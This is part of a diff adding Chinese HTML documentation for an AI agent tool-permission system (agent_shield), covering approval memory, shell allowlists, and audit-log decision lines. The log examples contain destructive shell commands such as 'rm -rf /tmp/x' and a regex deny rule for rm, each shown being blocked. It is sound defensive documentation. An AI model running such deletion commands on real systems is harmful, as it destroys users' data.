+              <td class="mod warn">会话记住</td>
+              <td>
+                权限 Rail 能力（非 shield）。引擎 ASK 后弹卡：勾「本会话记住」且点<strong>允许</strong>才写入 session；
+                <strong>拒绝不会记住</strong>，命中后也只会静默放行。
+                <br>命中规则：普通工具按<strong>工具名</strong>（如记住 <code>read_file</code> 后任意路径都过）；
+                shell（<code>bash</code> 等）按<strong>工具名:子命令</strong>（如 <code>bash:ls</code>，换路径仍过，但 <code>rm</code> 不过；复杂命令算不出 key 则记不住）。
+                <br>同批放行是另一套：同一次并行重放里，「允许一次」只惠及<strong>同工具名且参数完全一样</strong>的兄弟调用。
+              </td>
+              <td class="off">新开会话；弹卡时只选「允许一次」，别勾「本会话记住」</td>
+              <td class="on">勾「本会话记住」并允许后，再发会命中同一 key 的调用 → 应不再弹卡</td>
+            </tr>
+            <tr>
+              <td class="mod warn">审批卡</td>
+              <td>用户点允许 / 始终允许（写 overrides 并立刻 refresh）/ 拒绝。</td>
+              <td class="off"><code>approval_overrides: []</code>；勿点始终允许</td>
+              <td class="on">点始终允许后再发</td>
+            </tr>
+            <tr>
+              <td class="mod warn">执行层 allowlist</td>
+              <td>
+                <code>LocalWorkConfig.shell_allowlist</code>（执行器，非 shield）。引擎已 ALLOW 后仍可能拒。
+                匹配：取命令<strong>第一个 token</strong>，与名单项相等，或全路径以 <code>/名</code>（Windows 为 <code>\名</code>）结尾；不看参数。
+                <code>None</code>/<code>[]</code> 关闭；缺省会落到约 30 条默认前缀。
+                （勿与 <code>permissions.shell_allowlist</code> 混淆：那是引擎内组件，会在判定阶段 DENY。）
+              </td>
+              <td class="off"><code>shell_allowlist: null</code> 或 <code>[]</code></td>
+              <td class="on">非空名单，如 <code>["echo","ls"]</code> → <code>rm x</code> 在执行层拒</td>
+            </tr>
+            <tr>
+              <td class="mod warn">软删除</td>
+              <td>引擎放行后，删除仍可能改归档/二次确认。</td>
+              <td class="off">soft_delete 关（缺省）</td>
+              <td class="on"><code>soft_delete.enabled: true</code></td>
+            </tr>
+            <tr>
+              <td class="mod warn">FlashPermissionRail</td>
+              <td>
+                Flash 主路径挂这条（<code>PermissionInterruptRail</code> 的子类，与 Deep <strong>二选一</strong>），同样进 agent_shield。
+                差别：Flash 把多工具收成一张卡（如 <code>web_flash</code>），权限要把卡<strong>拆成背后真实工具</strong>再各查一次，取最严。
+                例：<code>web_flash.fetch</code> 两个 url → 先查 <code>web_flash</code>，再各查一次 <code>mcp_fetch_webpage</code>；
+                外层 allow、内层 ask/deny → 整次仍 ask/deny。Deep 无合并卡，模型直接调真工具，无此步。
+              </td>
+              <td class="off">用 Deep 主 Agent</td>
+              <td class="on">切 Flash；用合并卡（web/cron/todo 等）观察外层与内层取严</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p class="foot">
+          夹具 <code>docs/fixtures/w1a_e2e_permissions.yaml</code> · 用例 <code>testcase.md</code>
+          · 独立页 <code>runtime_context_relayclaw.html</code>（内容同源）
+        </p>
+      </div>
+    </div>
+    <a class="top-link" href="#top">↑ 回到顶部</a>
+  </section>
+
+  <!-- Audit log -->
+  <section class="sec" id="audit-log">
+    <h2>11. 审计日志（agent_shield）</h2>
+    <p class="sub">仅本库写出的日志契约 · 与 rail / 前端打的行无关 · 工具参数原文不落盘</p>
+
+    <div class="box hi-gray" style="margin-bottom:12px">
+      <div class="n">库写什么</div>
+      <div class="d">
+        普通 Python <code>logging</code>，logger 名为
+        <code>agent_shield.tool_permission.engine</code> /
+        <code>agent_shield.tool_permission.manager</code>。
+        消息正文是固定前缀 + <code>key=value</code> 字段；<strong>不指定文件名</strong>，落盘由宿主 Handler 决定。
+      </div>
+    </div>
+
+    <h3>11.1 事件一览</h3>
+    <table class="ref">
+      <thead><tr><th>消息前缀</th><th>何时</th><th>要点</th></tr></thead>
+      <tbody>
+        <tr>
+          <td class="k">permission.manager.update</td>
+          <td><code>update_config</code></td>
+          <td><code>key=… replaced=True|False</code></td>
+        </tr>
+        <tr>
+          <td class="k">permission.manager.remove</td>
+          <td><code>remove_config</code></td>
+          <td><code>key=… removed=…</code></td>
+        </tr>
+        <tr>
+          <td class="k">permission.manager.unregistered_key</td>
+          <td>未登记 key 来 check</td>
+          <td>warning；随后抛 KeyError</td>
+        </tr>
+        <tr>
+          <td class="k">permission.engine.decision</td>
+          <td>每次 <code>check_permission</code> 合并后</td>
+          <td>主审计行（见下）</td>
+        </tr>
+        <tr>
+          <td class="k">permission.engine.component_failed</td>
+          <td>某组件 evaluate 抛错</td>
+          <td><code>component=类名</code>；异常继续上抛</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>11.2 decision 行：字段与可选值</h3>
+    <pre class="ex">permission.engine.decision key=… tool=… kind=… shell=… decision=… matched_rule=… winner=… basis=… components=[…]</pre>
+    <table class="ref" style="margin-top:8px">
+      <thead><tr><th>字段</th><th>可选值 / 形态</th><th>含义</th></tr></thead>
+      <tbody>
+        <tr>
+          <td class="k">key</td>
+          <td>业务字符串 · <code>default</code> · <code>(one-off)</code> · 其它 label</td>
+          <td>引擎构造时的 <code>label</code>；Manager 登记键；一次性 <code>config=</code> 固定为 <code>(one-off)</code></td>
+        </tr>
+        <tr>
+          <td class="k">tool</td>
+          <td>任意工具名字符串</td>
+          <td>本次 <code>check_permission</code> 的工具名</td>
+        </tr>
+        <tr>
+          <td class="k">kind</td>
+          <td><code>original</code> · <code>unwrapped</code> · <code>subcommand</code></td>
+          <td>日志里取的是<strong>最后一个被评估的候选</strong>的类型（多候选时不一定等于「唯一原因」；定位看 <code>decision</code>/<code>matched_rule</code>/<code>components</code>）</td>
+        </tr>
+        <tr>
+          <td class="k">shell</td>
+          <td><code>True</code> · <code>False</code></td>
+          <td>该候选是否按 shell 路径处理（Python bool 的字符串形式）</td>
+        </tr>
+        <tr>
+          <td class="k">decision</td>
+          <td><code>allow</code> · <code>ask</code> · <code>deny</code></td>
+          <td>引擎最终结论（取最严合并后）</td>
+        </tr>
+        <tr>
+          <td class="k">matched_rule</td>
+          <td>规则 id 字符串 · 或 <code>None</code></td>
+          <td>与最终 <code>decision</code> 绑定的规则标签（如 <code>tools.bash</code>、<code>tiered_policy:rules:deny:rules[deny_rm]</code>）；组件放行但未挂规则 id 时可为 <code>None</code></td>
+        </tr>
+        <tr>
+          <td class="k">winner</td>
+          <td>组件类名 · 或 <code>-</code></td>
+          <td>在有意见的组件里，第一个「permission 与 matched_rule 都与最终结果相同」的组件名；对不上则为 <code>-</code></td>
+        </tr>
+        <tr>
+          <td class="k">basis</td>
+          <td><code>component</code> · <code>no_verdict</code> · <code>no_subscriber</code></td>
+          <td>
+            结论怎么来的：
+            <code>component</code>=至少有一个组件给出了非弃权意见并参与合并（常态）；
+            <code>no_verdict</code>=问过组件但全是 <code>none</code>；
+            <code>no_subscriber</code>=订阅列表为空（极端，正常路径少见）
+          </td>
+        </tr>
+        <tr>
+          <td class="k">components</td>
+          <td>见下方「怎么读」</td>
+          <td><strong>必须整段展开</strong>：每个组件一次意见；定位「谁拦的 / 谁弃权」靠这里，不能省略</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="explain" style="margin-top:10px">
+      <h4>components 怎么读</h4>
+      <p>固定组件顺序（每个候选一轮）：</p>
+      <p class="mono" style="margin:6px 0;line-height:1.5">InjectionComponent → CommandAllowlistComponent → DestructiveWarningComponent → TieredPolicyComponent → HostGuardComponent → FileGuardComponent → DeletionGuardComponent → ImmutableControlPlaneComponent → NetGuardComponent</p>
+      <ul>
+        <li>单项形态：<code>组件类名=none</code>（弃权）或 <code>组件类名=allow|ask|deny</code> 或 <code>组件类名=allow|ask|deny(规则id)</code></li>
+        <li>多候选（剥壳 / 子命令）时，<strong>按候选顺序把上述 9 项再追加一遍</strong>，所以列表会变长；对照时按每 9 个一组切</li>
+        <li>排障：先看最终 <code>decision</code> + <code>matched_rule</code> + <code>winner</code>，再在 <code>components</code> 里找同规则/同等级的项；<code>none</code> 表示该组件本轮没说话</li>
+      </ul>
+    </div>
+
+    <h3>11.3 示例（完整 message 正文，components 不省略）</h3>
+    <p class="note-line" style="margin-bottom:8px">配置示意：<code>package_builtin_rules: false</code>，<code>shell_allowlist: null</code>，file/host/net 关。</p>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph green">配置登记</div>
+      <pre class="ex">permission.manager.update key=u1 replaced=False</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph green">单工具 · ALLOW · 非 shell</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>read_file</code> · <code>tools.read_file: allow</code></div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=demo tool=read_file kind=original shell=False decision=allow matched_rule=tools.read_file winner=TieredPolicyComponent basis=component components=[InjectionComponent=none,CommandAllowlistComponent=none,DestructiveWarningComponent=none,TieredPolicyComponent=allow(tools.read_file),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph orange">单命令 · ASK</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>bash</code> · <code>command=ls</code> · <code>tools.bash: ask</code></div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=demo tool=bash kind=original shell=True decision=ask matched_rule=tools.bash winner=TieredPolicyComponent basis=component components=[InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=ask(tools.bash),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph red">单命令 · DENY</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>bash</code> · <code>command=rm -rf /tmp/x</code> · <code>tools.bash: deny</code></div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=demo tool=bash kind=original shell=True decision=deny matched_rule=tools.bash winner=TieredPolicyComponent basis=component components=[InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=deny(tools.bash),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph red">复合命令 · DENY（规则命中整串）</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>ls; rm -rf /tmp/y</code> · 规则 <code>deny_rm</code>（<code>re:\brm\b</code>）；本例未拆出子命令候选时仍是一组 9 项</div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=demo tool=bash kind=original shell=True decision=deny matched_rule=tiered_policy:rules:deny:rules[deny_rm] winner=TieredPolicyComponent basis=component components=[InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=deny(tiered_policy:rules:deny:rules[deny_rm]),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph red">剥壳 · DENY（components 两组：原文 + 剥壳）</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>bash -c "rm x"</code> · <code>kind=unwrapped</code>（最后评估的是剥壳候选）；列表含 18 项 = 2×9</div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=demo tool=bash kind=unwrapped shell=True decision=deny matched_rule=tiered_policy:rules:deny:rules[deny_rm] winner=TieredPolicyComponent basis=component components=[InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=deny(tiered_policy:rules:deny:rules[deny_rm]),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none,InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=deny(tiered_policy:rules:deny:rules[deny_rm]),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <div class="panel" style="margin-bottom:10px">
+      <div class="ph blue">临时 config= · key=(one-off)</div>
+      <div class="d" style="font-size:12px;margin-bottom:6px"><code>check_permission(…, config=cfg)</code>，不登记</div>
+      <pre class="ex" style="white-space:pre-wrap;word-break:break-all">permission.engine.decision key=(one-off) tool=bash kind=original shell=True decision=ask matched_rule=tools.bash winner=TieredPolicyComponent basis=component components=[InjectionComponent=allow,CommandAllowlistComponent=allow(shell_allowlist:disabled),DestructiveWarningComponent=none,TieredPolicyComponent=ask(tools.bash),HostGuardComponent=none,FileGuardComponent=none,DeletionGuardComponent=none,ImmutableControlPlaneComponent=none,NetGuardComponent=none]</pre>
+    </div>
+
+    <h3>11.4 relay-claw 集成 jiuwenswarm 时日志在哪</h3>
+    <div class="explain">
+      <p>AgentServer 启动时把 <code>agent_shield.tool_permission</code> 挂到滚动文件
+        <code>permissions.log</code>（另有控制台）。文件前缀形如：</p>
+      <pre class="ex" style="margin:8px 0">2026-10-29 19:00:00.123 INFO agent_shield.tool_permission.engine: permission.engine.decision …</pre>
+      <ul>
+        <li><b>路径</b>：<code>{LOG_ROOT_PATH}/permissions.log</code>；未设环境变量时默认
+          <code>~/.jiuwenswarm/service_default/.logs/permissions.log</code>（或 <code>service_{sid}/.logs</code>）。</li>
+        <li><b>relay-claw sidecar</b>：拉起 AgentServer 时通常注入
+          <code>LOG_ROOT_PATH=&lt;数据目录&gt;/service_default/.logs</code>
+         （数据目录来自 <code>JIUWENSWARM_DATA_DIR</code> / 兼容旧名 <code>JIUWENCLAW_DATA_DIR</code>）。
+          因此本机常见为：<code>&lt;JIUWENSWARM_DATA_DIR&gt;/service_default/.logs/permissions.log</code>。</li>
+        <li>同文件里还可能有调用方带 <code>[PermissionEngine]</code> 的行——那是 rail 自己打的，
+          <strong>不是</strong> agent_shield 契约；认引擎结论只搜 <code>permission.engine.decision</code>。</li>
+      </ul>
+    </div>
+    <a class="top-link" href="#top">↑ 回到顶部</a>
+  </section>
+</main>
+
+<script>
+(function () {
+  var links = Array.prototype.slice.call(document.querySelectorAll('.nav a[href^="#"]'));
+  var map = links.map(function (a) {
+    var id = a.getAttribute('href').slice(1);
+    return { a: a, el: document.getElementById(id) };
+  }).filter(function (x) { return x.el; });
+
+  function setActive() {
+    var y = window.scrollY + 80;
+    var cur = map[0];
+    for (var i = 0; i < map.length; i++) {
+      if (map[i].el.offsetTop <= y) cur = map[i];
+    }
+    links.forEach(function (a) { a.classList.remove('active'); });
+    if (cur) cur.a.classList.add('active');
+  }
+  window.addEventListener('scroll', setActive, { passive: true });
+  setActive();
+})();
+</script>
+</body>
+</html>
